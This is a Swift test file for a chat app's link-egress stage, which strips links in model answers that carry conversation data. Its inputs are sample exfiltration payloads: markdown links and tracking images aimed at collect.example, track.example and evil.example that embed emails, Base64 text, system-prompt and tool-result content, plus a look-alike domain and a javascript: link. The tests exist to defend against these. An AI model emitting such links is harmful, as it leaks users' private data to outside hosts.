import AgentMemoryKit
import ContextCompactionKit
import Foundation
import GuardrailKit
import LinkEgressKit
import PromptTemplateKit
import ProviderGatewayKit
import ResponseCacheKit
import RetrievalKit
import SemanticRouterKit
import SessionMaskKit
import Testing
@testable import AIChatApp

/// The URLs SwiftUI's `Text` would make tappable: Apple's parser, in the mode `LocalizedStringKey` uses.
private func liveLinks(_ markdown: String) -> [String] {
    let options = AttributedString.MarkdownParsingOptions(interpretedSyntax: .inlineOnlyPreservingWhitespace)
    guard let parsed = try? AttributedString(markdown: markdown, options: options) else { return ["<parse error>"] }
    return parsed.runs.compactMap { $0.link?.absoluteString }
}

/// A conversation whose vault has minted `[EMAIL_1]` for `ana@acme.io`, the way a real turn does.
private func seededMasks() async throws -> SessionMasks {
    let masks = SessionMasks()
    let prompts = PromptRegistry()
    try await prompts.register(name: "chat.system", template: "You are a helpful assistant. {{locale}}")
    let pipeline = PreModelPipeline(
        prompts: prompts,
        guardrail: GuardrailPipeline(policy: GuardrailPolicy()),
        router: SemanticRouter(),
        cache: ResponseCache(capacity: 4),
        memory: MemoryStore(),
        retriever: Retriever(embedder: HashingEmbeddingProvider()),
        compactor: ContextCompactor(strategies: [SlidingWindowCompactionStrategy()]),
        masks: masks
    )
    var trace = PipelineTrace()
    _ = await pipeline.prepare(
        userText: "ok",
        history: [ConversationMessage(role: .user, text: "Send it to ana@acme.io"), ConversationMessage(role: .assistant, text: "Sure.")],
        conversationID: SessionMasks.defaultConversation,
        trace: &trace
    )
    return masks
}

private func review(
    _ answer: String,
    masks: SessionMasks = SessionMasks(),
    messages: [LLMMessage] = [],
    sources: [RetrievedSource] = []
) async -> (AnswerReview, PipelineTrace) {
    let pipeline = PostModelPipeline(guardrail: GuardrailPipeline(policy: GuardrailPolicy()), masks: masks)
    var trace = PipelineTrace()
    let reviewed = await pipeline.review(answer: answer, sources: sources, messages: messages, trace: &trace)
    return (reviewed, trace)
}

private let booking = "Book TP 1351, booking ref QX7-ALPHA-2291, window seat."
private let encodedBooking = Data("booking ref QX7-ALPHA-2291".utf8).base64EncodedString()

@Suite("LinkEgressKit - links in the answer, before the restore")
struct LinkEgressStageTests {
    @Test("a session token in a model-written URL is unlinked before the restore can fill it in")
    func tokenNeverRestoredIntoALink() async throws {
        let masks = try await seededMasks()
        let answer = "Done. [Confirm your seat](https://collect.example/c?u=[EMAIL_1])"
        let (reviewed, trace) = await review(answer, masks: masks)
        #expect(reviewed.publishableText
            == "Done. Confirm your seat (link to collect[.]example removed: it carried your email address)")
        #expect(liveLinks(reviewed.publishableText).isEmpty)
        #expect(reviewed.wasModified)
        #expect(trace.outcome(for: .linkEgress)
            == .ran(detail: "unlinked 1 of 1 link(s): collect.example (it carried your email address)"))
        #expect(trace.outcome(for: .sessionRestore) == .noOp(reason: "no session tokens in the answer"))
        let stages = trace.records.map(\.stage)
        let check = try #require(stages.firstIndex(of: .linkEgress))
        #expect(stages[check - 1] == .hiddenTextOutput)
        #expect(stages[check + 1] == .sessionRestore)
        #expect(stages[check + 2] == .guardrailOutput)
    }

    @Test("without the check, restore and the output guardrail leave a live link to the collector")
    func whatTheStagePrevents() async throws {
        let masks = try await seededMasks()
        let vault = try #require(await masks.existingVault(for: SessionMasks.defaultConversation))
        let restored = await vault.restore("[Confirm](https://collect.example/c?u=[EMAIL_1])").text
        #expect(liveLinks(restored) == ["https://collect.example/c?u=ana@acme.io"])
        let screened = await GuardrailPipeline(policy: GuardrailPolicy()).screenResponse(restored).sanitizedText
        #expect(liveLinks(screened).count == 1)
        #expect(liveLinks(screened).first?.hasPrefix("https://collect.example/") == true)
        let image = "![ok](https://track.example/p.gif?r=\(encodedBooking))"
        let unscreened = await GuardrailPipeline(policy: GuardrailPolicy()).screenResponse(image)
        #expect(unscreened.sanitizedText == image)
    }

    @Test("what the user typed, Base64-encoded into an image URL, is removed")
    func conversationTextInAnImage() async {
        let (reviewed, trace) = await review(
            "![ok](https://track.example/p.gif?r=\(encodedBooking))",
            messages: [LLMMessage(role: .user, content: booking)]
        )
        #expect(reviewed.publishableText == "ok (image from track[.]example removed: it carried text from your messages)")
        #expect(trace.outcome(for: .linkEgress)
            == .ran(detail: "unlinked 1 of 1 link(s): track.example (it carried text from your messages)"))
    }

    @Test("the system prompt, a tool result, a retrieved passage and a relative link all count")
    func everySourceTheModelWasSent() async {
        let answer = "[a](https://rates.example/v?c=rate+code+NWD-STAFF-4410+applies) "
            + "[b](https://evil.example/?q=quarterly-revenue-forecast-northwind) "
            + "[c](https://other.example/?r=shipment+tracking+number+ZX4471902) "
            + "[d](/notes?t=booking+ref+QX7-ALPHA-2291) [e](https://docs.example.com/guide)"
        let messages = [
            LLMMessage(role: .system, content: "Internal: corporate rate code NWD-STAFF-4410 applies to Northwind."),
            LLMMessage(role: .user, content: booking),
            LLMMessage(role: .assistant, content: "Earlier answer."),
            LLMMessage(role: .tool, content: "Your shipment tracking number ZX4471902 is in transit.")
        ]
        let passages = [RetrievedSource(id: "r1", title: "r1",
                                        snippet: "The quarterly revenue forecast for the Northwind account is 4.2M.",
                                        relevancePercent: 90)]
        let (reviewed, trace) = await review(answer, messages: messages, sources: passages)
        #expect(trace.outcome(for: .linkEgress) == .ran(detail: "unlinked 4 of 5 link(s): "
            + "rates.example (it carried text from the system prompt); "
            + "evil.example (it carried text from a retrieved passage); "
            + "other.example (it carried text from a tool result); "
            + "a relative link (it carried text from your messages)"))
        // Grounding runs after this stage when there are passages and may strip a link-only
        // sentence, so the kept link is checked on the stage's own output.
        let pipeline = PostModelPipeline(guardrail: GuardrailPipeline(policy: GuardrailPolicy()))
        let context = await pipeline.linkContext(
            conversationID: SessionMasks.defaultConversation, messages: messages, sources: passages
        )
        var stageTrace = PipelineTrace()
        let checked = PostModelPipeline.checkLinks(answer, context: context, trace: &stageTrace)
        #expect(liveLinks(checked.text) == ["https://docs.example.com/guide"])
        let carried = ["NWD", "quarterly", "ZX4471902", "QX7"]
        #expect(!liveLinks(reviewed.publishableText).contains { link in carried.contains { link.contains($0) } })
    }

    @Test("ordinary links stay live, and the trace says how many were checked")
    func ordinaryLinksKept() async {
        let answer = "See [the guide](https://docs.example.com/guide) and www.example.org/about."
        let (reviewed, trace) = await review(answer, messages: [LLMMessage(role: .user, content: booking)])
        #expect(reviewed.publishableText == answer)
        #expect(!reviewed.wasModified)
        #expect(liveLinks(reviewed.publishableText).count == 2)
        #expect(trace.outcome(for: .linkEgress) == .noOp(reason: "checked 2 link(s); none carried conversation data"))
    }

    @Test("an image is reported, not removed, because Text never fetches it")
    func imagesReportedOnly() async {
        let (reviewed, trace) = await review("![chart](https://img.example/c.png)")
        #expect(reviewed.publishableText == "![chart](https://img.example/c.png)")
        #expect(trace.outcome(for: .linkEgress)
            == .noOp(reason: "checked 1 link(s); none carried conversation data; reported, kept: imageAutoload"))
        #expect(PostModelPipeline.linkPolicy.actions[.imageAutoload] == .keep)
    }

    @Test("an answer without links passes through")
    func noLinks() async {
        let (reviewed, trace) = await review("Lisbon is lovely in May.")
        #expect(reviewed.publishableText == "Lisbon is lovely in May.")
        #expect(trace.outcome(for: .linkEgress) == .noOp(reason: "no links in the answer"))
    }

    @Test("a look-alike link is annotated and a javascript link removed")
    func annotatedAndUnlinked() async {
        let (reviewed, trace) = await review("[apple.com](https://apple.com.evil.example/) or [run](javascript:alert(1))")
        #expect(reviewed.publishableText == "[apple.com](https://apple.com.evil.example/) (goes to apple[.]com[.]evil[.]example)"
            + " or run (link removed: javascript: links are not allowed)")
        #expect(trace.outcome(for: .linkEgress) == .ran(detail: "unlinked 1 of 2 link(s): javascript "
            + "(javascript: links are not allowed); annotated 1: apple.com.evil.example (goes to apple[.]com[.]evil[.]example)"))
        let (_, onlyAnnotated) = await review("[apple.com](https://apple.com.evil.example/)")
        #expect(onlyAnnotated.outcome(for: .linkEgress)
            == .ran(detail: "annotated 1: apple.com.evil.example (goes to apple[.]com[.]evil[.]example)"))
    }

    @Test("token categories, message roles and the stage's place in the table")
    func labelsRolesAndCatalog() throws {
        #expect(PostModelPipeline.label(for: .email) == "your email address")
        #expect(PostModelPipeline.label(for: .phone) == "your phone number")
        #expect(PostModelPipeline.label(for: .card) == "your card number")
        #expect(PostModelPipeline.label(for: .ssn) == "your social security number")
        #expect(PostModelPipeline.label(for: .tokenLiteral) == "a masked value")
        #expect(PostModelPipeline.egressSource(for: LLMMessage(role: .assistant, content: "x")) == nil)
        #expect(PostModelPipeline.egressSource(for: LLMMessage(role: .tool, content: "x"))?.origin == .tool)
        #expect(PipelineStage.linkEgress.package == "LinkEgressKit")
        #expect(PipelineStage.linkEgress.title == "Links in the answer")
    }
}
